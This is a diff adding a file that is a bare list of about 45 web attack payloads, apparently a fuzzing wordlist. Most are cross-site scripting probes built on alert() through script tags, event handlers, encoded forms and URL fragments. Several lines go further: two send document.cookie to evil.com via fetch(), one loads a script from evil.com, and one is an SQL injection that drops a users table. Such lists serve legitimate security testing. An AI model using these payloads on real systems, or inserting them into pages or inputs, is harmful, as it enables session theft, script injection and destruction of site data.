@@ -1,0 +1,45 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+" onmouseover=alert('XSS') x="
+';alert('XSS');//
+%3Cscript%3Ealert('XSS')%3C/script%3E
+<ScRiPt>alert('XSS')</ScRiPt>
+<iframe src=javascript:alert('XSS')>
+<object data=javascript:alert('XSS')>
+' autofocus onfocus=alert('XSS') '
+<video><source onerror=alert('XSS')>
+"+alert('XSS')+"
+<details open ontoggle=alert('XSS')>
+<math><script>alert('XSS')</script></math>
+<input value=""><script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert('stored')>
+" onclick=alert('admin') "
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+<ScRiPt src='http://evil.com/xss.js'></ScRiPt>
+<iframe srcdoc='<script>alert(1)</script>'>
+' onfocus=alert(1) autofocus='
+<body onload=alert('XSS')>
+';fetch('https://evil.com/steal?cookie='+document.cookie)//
+<details ontoggle=alert('stored') open>
+<audio src=x onerror=alert('XSS')>
+<link rel=import href='data:text/html,<script>alert(1)</script>'>
+<form id=test><button formaction=javascript:alert(1)>
+<textarea></textarea><script>alert('stored')</script>
+<meta http-equiv=refresh content='0;javascript:alert(1)'>
+#<img src=x onerror=alert('DOM')>
+?name=<img src=x onerror=alert(document.cookie)>
+javascript:alert('DOM XSS')
+?callback=alert(1)
+#<svg onload=alert(1)>
+"+fetch('https://evil.com/steal?c='+btoa(document.cookie))+"
+?<img src=x onerror=alert(1)>
+#javascript:alert('hash')
+?name=<script>alert(1)</script>
+?json={"name":"<img src=x onerror=alert(1)>"}
+?redirect=javascript:alert('DOM')
+?html=<iframe srcdoc='<script>alert(1)</script>'>
+?name=Robert'); DROP TABLE users;--
+#<img src=1 onerror=alert(document.domain)>
+?postMessage=<img src=x onerror=alert(1)>
